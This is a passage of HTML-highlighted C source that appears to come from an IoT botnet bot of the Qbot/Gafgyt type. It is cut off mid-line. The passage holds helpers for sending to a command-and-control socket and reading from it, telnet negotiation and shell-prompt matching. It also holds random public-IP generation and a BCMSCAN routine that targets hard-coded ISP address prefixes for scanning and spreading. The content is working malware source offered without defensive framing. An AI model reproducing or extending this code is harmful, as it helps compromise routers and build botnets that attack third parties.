<span class="string">&#x27;0&#x27;</span> &amp;&amp; *format &lt;= <span class="string">&#x27;9&#x27;</span>; ++format) &#123;</span><br><span class="line">                                width *= <span class="number">10</span>;</span><br><span class="line">                                width += *format - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>( *format == <span class="string">&#x27;s&#x27;</span> ) &#123;</span><br><span class="line">                                <span class="keyword">register</span> <span class="keyword">char</span> *s = (<span class="keyword">char</span> *)va_arg( args, <span class="keyword">int</span> );</span><br><span class="line">                                pc += prints (out, s?s:<span class="string">&quot;(null)&quot;</span>, width, pad);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>( *format == <span class="string">&#x27;d&#x27;</span> ) &#123;</span><br><span class="line">                                pc += printi (out, va_arg( args, <span class="keyword">int</span> ), <span class="number">10</span>, <span class="number">1</span>, width, pad, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>( *format == <span class="string">&#x27;x&#x27;</span> ) &#123;</span><br><span class="line">                                pc += printi (out, va_arg( args, <span class="keyword">int</span> ), <span class="number">16</span>, <span class="number">0</span>, width, pad, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>( *format == <span class="string">&#x27;X&#x27;</span> ) &#123;</span><br><span class="line">                                pc += printi (out, va_arg( args, <span class="keyword">int</span> ), <span class="number">16</span>, <span class="number">0</span>, width, pad, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>( *format == <span class="string">&#x27;u&#x27;</span> ) &#123;</span><br><span class="line">                                pc += printi (out, va_arg( args, <span class="keyword">int</span> ), <span class="number">10</span>, <span class="number">0</span>, width, pad, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>( *format == <span class="string">&#x27;c&#x27;</span> ) &#123;</span><br><span class="line">                                scr[<span class="number">0</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)va_arg( args, <span class="keyword">int</span> );</span><br><span class="line">                                scr[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                                pc += prints (out, scr, width, pad);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">out:</span><br><span class="line">                        printchar (out, *format);</span><br><span class="line">                        ++pc;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (out) **out = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        va_end( args );</span><br><span class="line">        <span class="keyword">return</span> pc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">zprintf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *format, ...)</span> </span>&#123;</span><br><span class="line">        va_list args;</span><br><span class="line">        va_start( args, format );</span><br><span class="line">        <span class="keyword">return</span> print( <span class="number">0</span>, format, args );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">szprintf</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *out, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *format, ...)</span> </span>&#123;</span><br><span class="line">        va_list args;</span><br><span class="line">        va_start( args, format );</span><br><span class="line">        <span class="keyword">return</span> print( &amp;out, format, args );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sockprintf</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">char</span> *formatStr, ...)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *textBuffer = <span class="built_in">malloc</span>(<span class="number">2048</span>);</span><br><span class="line">        <span class="built_in">memset</span>(textBuffer, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">char</span> *orig = textBuffer;</span><br><span class="line">        va_list args;</span><br><span class="line">        va_start(args, formatStr);</span><br><span class="line">        print(&amp;textBuffer, formatStr, args);</span><br><span class="line">        va_end(args);</span><br><span class="line">        orig[<span class="built_in">strlen</span>(orig)] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        zprintf(<span class="string">&quot;%s\n&quot;</span>, orig);</span><br><span class="line">        <span class="keyword">int</span> q = send(sock,orig,<span class="built_in">strlen</span>(orig), MSG_NOSIGNAL);</span><br><span class="line">        <span class="built_in">free</span>(orig);</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wildString</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* pattern, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="built_in">string</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(*pattern) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>: <span class="keyword">return</span> *<span class="built_in">string</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> !(!wildString(pattern+<span class="number">1</span>, <span class="built_in">string</span>) || *<span class="built_in">string</span> &amp;&amp; !wildString(pattern, <span class="built_in">string</span>+<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>: <span class="keyword">return</span> !(*<span class="built_in">string</span> &amp;&amp; !wildString(pattern+<span class="number">1</span>, <span class="built_in">string</span>+<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> !((<span class="built_in">toupper</span>(*pattern) == <span class="built_in">toupper</span>(*<span class="built_in">string</span>)) &amp;&amp; !wildString(pattern+<span class="number">1</span>, <span class="built_in">string</span>+<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHost</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *toGet, struct in_addr *i)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">h</span>;</span></span><br><span class="line">        <span class="keyword">if</span>((i-&gt;s_addr = inet_addr(toGet)) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makeRandomStr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; length; i++) buf[i] = (rand_cmwc()%(<span class="number">91</span><span class="number">-65</span>))+<span class="number">65</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recvLine</span><span class="params">(<span class="keyword">int</span> socket, <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> bufsize)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, bufsize);</span><br><span class="line">        fd_set myset;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">        tv.tv_sec = <span class="number">30</span>;</span><br><span class="line">        tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">        FD_ZERO(&amp;myset);</span><br><span class="line">        FD_SET(socket, &amp;myset);</span><br><span class="line">        <span class="keyword">int</span> selectRtn, retryCount;</span><br><span class="line">        <span class="keyword">if</span> ((selectRtn = select(socket+<span class="number">1</span>, &amp;myset, <span class="literal">NULL</span>, &amp;myset, &amp;tv)) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(retryCount &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                        tv.tv_sec = <span class="number">30</span>;</span><br><span class="line">                        tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">                        FD_ZERO(&amp;myset);</span><br><span class="line">                        FD_SET(socket, &amp;myset);</span><br><span class="line">                        <span class="keyword">if</span> ((selectRtn = select(socket+<span class="number">1</span>, &amp;myset, <span class="literal">NULL</span>, &amp;myset, &amp;tv)) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                retryCount++;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> tmpchr;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *cp;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        cp = buf;</span><br><span class="line">        <span class="keyword">while</span>(bufsize-- &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(recv(mainCommSock, &amp;tmpchr, <span class="number">1</span>, <span class="number">0</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">                        *cp = <span class="number">0x00</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *cp++ = tmpchr;</span><br><span class="line">                <span class="keyword">if</span>(tmpchr == <span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">                count++;</span><br><span class="line">        &#125;</span><br><span class="line">        *cp = <span class="number">0x00</span>;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connectTimeout</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *host, <span class="keyword">int</span> port, <span class="keyword">int</span> timeout)</span> </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_addr</span>;</span></span><br><span class="line">        fd_set myset;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">        <span class="keyword">socklen_t</span> lon;</span><br><span class="line">        <span class="keyword">int</span> valopt;</span><br><span class="line">        <span class="keyword">long</span> arg = fcntl(fd, F_GETFL, <span class="literal">NULL</span>);</span><br><span class="line">        arg |= O_NONBLOCK;</span><br><span class="line">        fcntl(fd, F_SETFL, arg);</span><br><span class="line">        dest_addr.sin_family = AF_INET;</span><br><span class="line">        dest_addr.sin_port = htons(port);</span><br><span class="line">        <span class="keyword">if</span>(getHost(host, &amp;dest_addr.sin_addr)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dest_addr.sin_zero, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> dest_addr.sin_zero);</span><br><span class="line">        <span class="keyword">int</span> res = connect(fd, (struct sockaddr *)&amp;dest_addr, <span class="keyword">sizeof</span>(dest_addr));</span><br><span class="line">        <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == EINPROGRESS) &#123;</span><br><span class="line">                        tv.tv_sec = timeout;</span><br><span class="line">                        tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">                        FD_ZERO(&amp;myset);</span><br><span class="line">                        FD_SET(fd, &amp;myset);</span><br><span class="line">                        <span class="keyword">if</span> (select(fd+<span class="number">1</span>, <span class="literal">NULL</span>, &amp;myset, <span class="literal">NULL</span>, &amp;tv) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                lon = <span class="keyword">sizeof</span>(<span class="keyword">int</span>);</span><br><span class="line">                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (<span class="keyword">void</span>*)(&amp;valopt), &amp;lon);</span><br><span class="line">                                <span class="keyword">if</span> (valopt) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arg = fcntl(fd, F_GETFL, <span class="literal">NULL</span>);</span><br><span class="line">        arg &amp;= (~O_NONBLOCK);</span><br><span class="line">        fcntl(fd, F_SETFL, arg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listFork</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> parent, *newpids, i;</span><br><span class="line">        parent = fork();</span><br><span class="line">        <span class="keyword">if</span> (parent &lt;= <span class="number">0</span>) <span class="keyword">return</span> parent;</span><br><span class="line">        numpids++;</span><br><span class="line">        newpids = (<span class="keyword">uint32_t</span>*)<span class="built_in">malloc</span>((numpids + <span class="number">1</span>) * <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; numpids - <span class="number">1</span>; i++) newpids[i] = pids[i];</span><br><span class="line">        newpids[numpids - <span class="number">1</span>] = parent;</span><br><span class="line">        <span class="built_in">free</span>(pids);</span><br><span class="line">        pids = newpids;</span><br><span class="line">        <span class="keyword">return</span> parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negotiate</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">switch</span> (buf[<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> CMD_IAC: <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> CMD_WILL:</span><br><span class="line">        <span class="keyword">case</span> CMD_WONT:</span><br><span class="line">        <span class="keyword">case</span> CMD_DO:</span><br><span class="line">        <span class="keyword">case</span> CMD_DONT:</span><br><span class="line">                c = CMD_IAC;</span><br><span class="line">                send(sock, &amp;c, <span class="number">1</span>, MSG_NOSIGNAL);</span><br><span class="line">                <span class="keyword">if</span> (CMD_WONT == buf[<span class="number">1</span>]) c = CMD_DONT;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (CMD_DONT == buf[<span class="number">1</span>]) c = CMD_WONT;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (OPT_SGA == buf[<span class="number">1</span>]) c = (buf[<span class="number">1</span>] == CMD_DO ? CMD_WILL : CMD_DO);</span><br><span class="line">                <span class="keyword">else</span> c = (buf[<span class="number">1</span>] == CMD_DO ? CMD_WONT : CMD_DONT);</span><br><span class="line">                send(sock, &amp;c, <span class="number">1</span>, MSG_NOSIGNAL);</span><br><span class="line">                send(sock, &amp;(buf[<span class="number">2</span>]), <span class="number">1</span>, MSG_NOSIGNAL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">matchPrompt</span><span class="params">(<span class="keyword">char</span> *bufStr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *prompts = <span class="string">&quot;:&gt;%$#\0&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> bufLen = <span class="built_in">strlen</span>(bufStr);</span><br><span class="line">        <span class="keyword">int</span> i, q = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(prompts); i++) &#123;</span><br><span class="line">                <span class="keyword">while</span>(bufLen &gt; q &amp;&amp; (*(bufStr + bufLen - q) == <span class="number">0x00</span> || *(bufStr + bufLen - q) == <span class="string">&#x27; &#x27;</span> || *(bufStr + bufLen - q) == <span class="string">&#x27;\r&#x27;</span> || *(bufStr + bufLen - q) == <span class="string">&#x27;\n&#x27;</span>)) q++;</span><br><span class="line">                <span class="keyword">if</span>(*(bufStr + bufLen - q) == prompts[i]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint8_t</span> ipState[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">getRandomPublicIP</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ipState[<span class="number">0</span>] = rand() % <span class="number">223</span>;</span><br><span class="line">        ipState[<span class="number">1</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">        ipState[<span class="number">2</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">        ipState[<span class="number">3</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">while</span>(</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">0</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">10</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">100</span> &amp;&amp; (ipState[<span class="number">1</span>] &gt;= <span class="number">64</span> &amp;&amp; ipState[<span class="number">1</span>] &lt;= <span class="number">127</span>)) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">127</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">169</span> &amp;&amp; ipState[<span class="number">1</span>] == <span class="number">254</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">172</span> &amp;&amp; (ipState[<span class="number">1</span>] &lt;= <span class="number">16</span> &amp;&amp; ipState[<span class="number">1</span>] &lt;= <span class="number">31</span>)) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">192</span> &amp;&amp; ipState[<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; ipState[<span class="number">2</span>] == <span class="number">2</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">192</span> &amp;&amp; ipState[<span class="number">1</span>] == <span class="number">88</span> &amp;&amp; ipState[<span class="number">2</span>] == <span class="number">99</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">192</span> &amp;&amp; ipState[<span class="number">1</span>] == <span class="number">168</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">198</span> &amp;&amp; (ipState[<span class="number">1</span>] == <span class="number">18</span> || ipState[<span class="number">1</span>] == <span class="number">19</span>)) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">198</span> &amp;&amp; ipState[<span class="number">1</span>] == <span class="number">51</span> &amp;&amp; ipState[<span class="number">2</span>] == <span class="number">100</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] == <span class="number">203</span> &amp;&amp; ipState[<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; ipState[<span class="number">2</span>] == <span class="number">113</span>) ||</span><br><span class="line">                (ipState[<span class="number">0</span>] &gt;= <span class="number">224</span>)</span><br><span class="line">        )</span><br><span class="line">        &#123;</span><br><span class="line">                ipState[<span class="number">0</span>] = rand() % <span class="number">223</span>;</span><br><span class="line">                ipState[<span class="number">1</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">                ipState[<span class="number">2</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">                ipState[<span class="number">3</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        szprintf(ip, <span class="string">&quot;%d.%d.%d.%d&quot;</span>, ipState[<span class="number">0</span>], ipState[<span class="number">1</span>], ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> inet_addr(ip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">in_addr_t</span> <span class="title">BCMSCAN</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">ipState[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">ipState[<span class="number">0</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">1</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">2</span>] = rand() % <span class="number">255</span>;</span><br><span class="line">ipState[<span class="number">3</span>] = rand() % <span class="number">255</span>;</span><br><span class="line"><span class="keyword">int</span> randnum = rand() % <span class="number">37</span>;</span><br><span class="line"><span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.11.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;146.158.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;185.4.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;188.76.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;188.77.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;188.78.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;188.79.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;212.106.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;212.9.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;213.179.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.11.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.132.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">12</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.133.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">13</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.134.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">14</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.135.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.14.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.15.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">17</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.35.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">18</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;37.97.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">19</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;62.14.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.216.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">21</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.217.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">22</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.218.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">23</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.219.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.220.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">25</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.221.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">26</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.222.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">27</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;87.223.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span 